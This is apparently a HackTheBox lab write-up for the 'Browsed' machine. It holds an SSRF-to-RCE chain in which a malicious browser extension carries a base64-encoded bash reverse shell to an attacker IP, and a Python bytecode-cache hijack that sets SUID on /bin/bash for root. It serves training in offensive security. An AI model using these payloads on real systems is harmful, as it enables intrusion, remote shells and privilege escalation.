# Browsed

**Target IP:** `10.129.244.79`  
**Hostname:** `browsed.htb`  
**Platform:** `Linux`  
**Difficulty:** `Medium`

---

## 1. Enumeration

### Port Scan

```
PORT   STATE  SERVICE
22/tcp open   ssh
80/tcp open   http
```

Classic HTTP + SSH combo, I start my recon at the web service running on port 80, as this is often where most vulnerabilities can be found.

### Web Reconnaissance

The site appears to be built for the sharing of browser extensions, with uploads in zip format, with a note that files must be placed directly inside the archive and not in a subfolder. 
![[Pasted image 20260330134040.png]]

The site also mentions Chrome version 134. There is mention that a developer will review uploaded extensions and respond with feedback.
![[Pasted image 20260330134013.png]]

Navigating to `/samples.html` reveals some example extensions available for download.
![[Pasted image 20260330134056.png]]

I test the upload functionality by downloading one of the sample extensions and uploading it, which returns a very verbose log:
![[Pasted image 20260330134230.png]]

Directory fuzzing:

```bash
feroxbuster --url http://browsed.htb/
```
![[Pasted image 20260330134544.png]]

This returns nothing of note

Subdomain / vhost enumeration:

```bash
ffuf -c -u http://10.129.244.79 -H "Host: FUZZ.browsed.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301
```

This returns many 200 responses, so I change it to filter based on word length:
```bash
ffuf -c -u http://10.129.244.79 -H "Host: FUZZ.browsed.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 444
```
![[Pasted image 20260330141424.png]]
No additional subdomains were found.

### Additional Enumeration - Output log
The output log provided when uploading a file extension was very verbose, and likely contains some sensitive information. In the interest of time, I pass this log file to an AI agent to summarise any interesting findings.

It finds that on the backend when we upload an extension it is being loaded into `Chrome for Testing` running headlessly under `/var/www`. 
![[Pasted image 20260330135034.png]]

It also identifies a potential gitea instance on `http://browsedinternals.htb` which is being called out to by the browser during the execution and responses are being returned, suggesting it is allowed to make authenticated requests. 
![[Pasted image 20260330135102.png]]

It also highlights that gitea 1.24.5 is likely in use and that SSRF or XSS is likely our way forward.
![[Pasted image 20260330135117.png]]

---

## 2. Browsedinternals Enumeration
Knowing that there is likely another host, `browsedinternals.htb`, I add this to my `/etc/hosts` and see if it is externally accessible. It resolves and shows the default gitea web page:
![[Pasted image 20260330135536.png]]

Navigating to explore, we see a singular repository by a user named **larry**:
![[Pasted image 20260330135627.png]]

Viewing this repo, it appears to be a flask application running internally on port 5000. It is running on `127.0.0.1` and so should only be accessible via localhost:
![[Pasted image 20260330135727.png]]

The app has several endpoints:
- `/` - default index page
- `/files` - lists all saved HTML files
- `/routines/<rid>` - Calls routines.sh with the argument rid
- `/view/<filename>`- Views the specified filename
- `/submit` - Uploads a file

The overall function of this app seems to be to allow the user to upload a markdown .md file, which the server converts to html and then hosts on the server, which you can interact with at the other endpoints.

However, the inclusion of the `/routines` endpoint is suspicious as this doesn't match inline with the functionality of the app. Viewing `routines.sh` we see it takes the rid argument given and compares this to a number (0,1,2 or 3) and then executes a certain "Routine" based on this:
![[Pasted image 20260330140222.png]]

---

## 3. Initial Foothold — SSRF to RCE via Extension Content Script

### RCE in routines.sh
The code shown above is vulnerable to code injection via the following line - 
```bash
if [[ "$1" -eq 0 ]]; then
```

The intended use of this is to take argument 1 (`$1`) and compare whether this is equal to 0. This seems safe, however  it turns out, when using the `-eq` operator, you can craft a malicious argument which will instead execute the commands.

**Reference**: https://yossarian.net/til/post/some-surprising-code-execution-sources-in-bash/

### The plan
We have identified a potential RCE vulnerability on the internal service running on port 5000, however we cannot directly interact with this service. We do know that the headless browser can connect to internal and external sites however, as we can see in the log there are calls to localhost:
![[Pasted image 20260330140748.png]]

Therefore, if we can craft an extension that when loaded will make an internal call to the service running on localhost:5000, we can execute our RCE and gain a shell. In order to do this I first view all the sample extensions given and identify that the  ReplaceImages extension might be the best fit as it replaces every image on a page with one from a separate URL. If I change the URL to be my localhost, we can test if this would work.

### Testing SSRF
I take the ReplaceImages extension from the samples page and modify the content.js to the following:

```js
fetch('http://10.10.14.2');
```

And I set up a simple listener on my host:
```bash
sudo nc -lvnp 80
```

I then zip the extension back up and upload it. And we get a hit on our listener:
![[Pasted image 20260330141513.png]]
### SSRF + RCE exploitation

With confirmed callback, the fetch is redirected to trigger the internal service. Direct bash reverse shell attempts in the URL fail, so the payload is base64-encoded to avoid issues with special characters and spaces:

```bash
http://localhost:5000/routines/a[$(printf%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIvNDQ0NCAwPiYx|base64%20-d|bash)]
```

This is embedded in `content.js`, I also set the mode to no-cors to make sure the request is sent properly and not blocked by the cors policy:

```js
fetch('http://localhost:5000/routines/a[$(printf%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIvNDQ0NCAwPiYx|base64%20-d|bash)]', {mode:'no-cors'});
```
I then zip this back up and upload, with a penelope listener set up to catch the shell. We get a hit and a shell as `larry` as well as the user flag:
![[Pasted image 20260330143326.png]]

---

## 4. Privilege Escalation — Python Bytecode Hijack

### Enumeration

Checking sudo permissions:

```bash
sudo -l
```

The current user can run the following as root without a password:

```
/opt/extensiontool/extension_tool.py
```

Viewing this file, it appears to be a script which takes an extension in one of the directory names in `extensions` and performs a few actions on it, such as bumping versions:
![[Pasted image 20260330143710.png]]

Inside `/opt/extensiontool/` the `__pycache__` folder is world writable, allowing any user to write files here:
![[Pasted image 20260330143451.png]]

Because the python file starts with 
```python
from extension_utils import validate_manifest, clean_temp_files
```
and this is not a known library, it automatically compiles these files, which it places in `__pycache__` when ran, unless they are already found. 

### Exploitation

In order to exploit this we can follow similar steps to as in this 

**Reference**: https://python.plainenglish.io/python-cache-poisoning-elevating-your-privileges-with-malicious-bytecode-278c9cba0e22

First, we create a malicious `extension_utils.py` to set the SUID bit on `/bin/bash`:

```python
import os

def validate_manifest(test):
    os.system('chmod +s /bin/bash')

def clean_temp_files(test):
    os.system('chmod +s /bin/bash')
```

We then compile this to a pyc file:

```bash
python3 -m py_compile /tmp/extension_utils.py
cp /tmp/__pycache__/extension_utils.cpython-312.pyc ./__pycache__/exploit.pyc
```

However, because Python validates the `.pyc` header before execution, we need to update the header to what it is expecting to see. To do this the 16-byte header is "stolen" from the legitimate file and prepended to the malicious bytecode:

```bash
cd __pycache__

# Extract header from legitimate file
dd if=extension_utils.cpython-312.pyc of=header.bin bs=1 count=16

# Extract body from malicious file
dd if=exploit.pyc of=body.bin bs=1 skip=16

# Replace with patched file
rm extension_utils.cpython-312.pyc
cat header.bin body.bin > extension_utils.cpython-312.pyc
```

The tool is then run as root to trigger the hijacked import:

```bash
cd ..
sudo ./extension_tool.py --ext Timer
```

With the SUID bit set, a root shell is obtained:

```bash
/bin/bash -p
```

And with this we can get the root flag:
![[Pasted image 20260330154959.png]]

---

## Summary

|Step|Technique|
|---|---|
|Initial access|CVE-2026-0628 — SSRF via malicious browser extension; `content.js` modified to fetch an internal `localhost:5000` endpoint with a base64-encoded reverse shell payload|
|Credential access|Gitea instance discovered via internal DNS callout in application logs; source code reveals internal service on `localhost:5000`|
|User shell|SSRF-triggered command injection against `localhost:5000/routines/` using bracket glob expansion with a base64-encoded bash payload|
|Privilege escalation|Write access to `__pycache__` abused to replace `extension_utils.cpython-312.pyc` with a malicious bytecode payload; header patched from legitimate file; SUID set on `/bin/bash` via `sudo extension_tool.py`|